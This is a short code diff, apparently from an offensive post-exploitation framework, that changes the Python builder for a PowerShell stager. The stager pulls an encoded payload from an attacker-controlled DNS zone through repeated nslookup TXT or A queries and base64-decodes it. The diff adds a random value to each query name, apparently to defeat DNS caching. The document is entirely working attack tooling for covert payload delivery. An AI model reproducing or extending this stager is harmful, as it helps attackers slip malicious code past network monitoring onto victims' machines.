@@ -240,15 +240,15 @@ class PlatformPowershell(Platform, ModuleBase):
                 server = ""
 
             # TODO: Consider using helps.randomize_capitalization(...)
-            stager = ''
+            stager = '$r=Get-Random;'
             if dnstype == "TXT":
                 stager += '$a="";for($i=0;;$i++){'
-                stager += '$c=([string](IEX "nslookup -type=TXT s$($i).{}. {}")).Split({})[1];'.format(zone, server, "'\"'")
+                stager += '$c=([string](IEX "nslookup -type=TXT s$($i)r$($r).{}. {}")).Split({})[1];'.format(zone, server, "'\"'")
                 stager += 'if(!$c){break;}$a+=$c;}'
                 stager += '$a=[Convert]::FromBase64String($a);'
             elif dnstype == "A":
                 stager += '$a=New-Object char[](0);for($i=0;;$i++){'
-                stager += '$c=([regex]"\s+").Split([string](IEX "nslookup -type=A s$($i).{}. {}"));'.format(zone, server)
+                stager += '$c=([regex]"\s+").Split([string](IEX "nslookup -type=A s$($i)r$($r).{}. {}"));'.format(zone, server)
                 stager += 'if($c.Length-lt7-or$c.Length-gt11){break;}$a+=$c[-2].Split(".")}'
                 stager += '$a=$a|%{[Convert]::ToInt32($_)};'
             else:
